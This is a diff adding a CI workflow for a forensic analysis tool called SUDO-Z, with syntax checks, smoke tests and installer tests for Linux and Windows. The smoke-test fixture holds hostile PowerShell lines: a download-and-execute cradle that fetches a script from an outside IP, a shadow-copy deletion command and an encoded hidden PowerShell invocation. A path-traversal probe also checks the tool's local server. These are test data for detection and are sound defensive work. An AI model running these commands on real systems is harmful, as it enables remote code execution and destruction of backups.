@@ -1,0 +1,92 @@
+name: CI
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+  workflow_dispatch:
+
+jobs:
+  check:
+    name: Syntax + engine smoke test
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+      - name: Syntax check every module
+        run: for f in $(git ls-files '*.js' '*.mjs'); do node --check "$f" || exit 1; done
+      - name: Engine smoke test
+        run: |
+          cat > /tmp/smoke.mjs <<'EOF'
+          const { analyze } = await import(process.cwd() + '/js/engine.js');
+          const enc = (s) => new TextEncoder().encode(s);
+          const rep = await analyze([
+            { name: 'ConsoleHost_history.txt', data: enc('IEX (New-Object Net.WebClient).DownloadString("http://45.77.12.9/a.ps1")\nvssadmin delete shadows /all /quiet\n') },
+            { name: 'empty.bin', data: new Uint8Array() },
+          ]);
+          console.log(rep.verdict, rep.severity, rep.counts);
+          if (!rep.severity.critical) throw new Error('expected a critical finding');
+          if (rep.counts.rejected !== 1) throw new Error('expected one rejected file');
+          if (!rep.indicators.some((i) => i.value === '45.77.12.9')) throw new Error('expected IP indicator');
+          EOF
+          node /tmp/smoke.mjs
+      - name: CLI runs
+        run: |
+          printf 'powershell -nop -w hidden -enc SQBFAFgA\n' > ConsoleHost_history.txt
+          node cli/sudo-z.mjs ConsoleHost_history.txt -o /tmp/out
+          test -s /tmp/out/report.md
+
+  installer-linux:
+    name: Installer (Linux)
+    if: github.event_name != 'pull_request'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Install from GitHub
+        run: curl -fsSL "https://raw.githubusercontent.com/${{ github.repository }}/${{ github.sha }}/install.sh" | SUDOZ_DIR=$RUNNER_TEMP/sz SUDOZ_BIN=$RUNNER_TEMP/bin bash
+      - name: Re-run is an update no-op
+        run: curl -fsSL "https://raw.githubusercontent.com/${{ github.repository }}/${{ github.sha }}/install.sh" | SUDOZ_DIR=$RUNNER_TEMP/sz SUDOZ_BIN=$RUNNER_TEMP/bin bash | tee /tmp/second.log && grep -q "up to date" /tmp/second.log
+      - name: Forced update replaces the code
+        run: |
+          echo junk > $RUNNER_TEMP/sz/app/STALE
+          $RUNNER_TEMP/bin/sudo-z update
+          SUDOZ_FORCE=1 SUDOZ_DIR=$RUNNER_TEMP/sz SUDOZ_BIN=$RUNNER_TEMP/bin bash $RUNNER_TEMP/sz/app/install.sh
+          test ! -e $RUNNER_TEMP/sz/app/STALE
+      - name: Launcher serves the console
+        run: |
+          $RUNNER_TEMP/bin/sudo-z version
+          ($RUNNER_TEMP/bin/sudo-z start 8799 &) ; sleep 3
+          curl -fsS http://localhost:8799/ | grep -q "SUDO-Z"
+          curl -fsSI http://localhost:8799/js/engine.js | grep -qi "javascript"
+
+  installer-windows:
+    name: Installer (Windows)
+    if: github.event_name != 'pull_request'
+    runs-on: windows-latest
+    steps:
+      - name: Install from GitHub
+        shell: powershell
+        run: |
+          $s = Invoke-RestMethod "https://raw.githubusercontent.com/${{ github.repository }}/${{ github.sha }}/install.ps1"
+          & ([scriptblock]::Create($s)) -Dir "$env:RUNNER_TEMP\sz" -NoShortcut
+          if (-not (Test-Path "$env:RUNNER_TEMP\sz\app\index.html")) { throw 'not installed' }
+          if (-not (Test-Path "$env:RUNNER_TEMP\sz\sudo-z.cmd")) { throw 'no launcher' }
+      - name: Update replaces old code
+        shell: powershell
+        run: |
+          Set-Content "$env:RUNNER_TEMP\sz\app\STALE" 'junk'
+          & "$env:RUNNER_TEMP\sz\app\install.ps1" -Dir "$env:RUNNER_TEMP\sz" -NoShortcut -Force
+          if (Test-Path "$env:RUNNER_TEMP\sz\app\STALE") { throw 'old code not replaced' }
+          & "$env:RUNNER_TEMP\sz\sudo-z.cmd" version
+          & "$env:RUNNER_TEMP\sz\sudo-z.cmd" update
+      - name: Launcher serves the console
+        shell: powershell
+        run: |
+          Start-Process -FilePath "$env:RUNNER_TEMP\sz\sudo-z.cmd" -ArgumentList 'start','-Port','8799','-NoBrowser'
+          Start-Sleep 6
+          $r = Invoke-WebRequest http://localhost:8799/ -UseBasicParsing
+          if ($r.Content -notmatch 'SUDO-Z') { throw 'index not served' }
+          $j = Invoke-WebRequest http://localhost:8799/js/engine.js -UseBasicParsing
+          if ($j.Headers['Content-Type'] -notmatch 'javascript') { throw "bad MIME $($j.Headers['Content-Type'])" }
+          try { Invoke-WebRequest 'http://localhost:8799/..%2f..%2fversion.txt' -UseBasicParsing; throw 'path traversal not blocked' } catch { if ($_.Exception.Message -eq 'path traversal not blocked') { throw } }
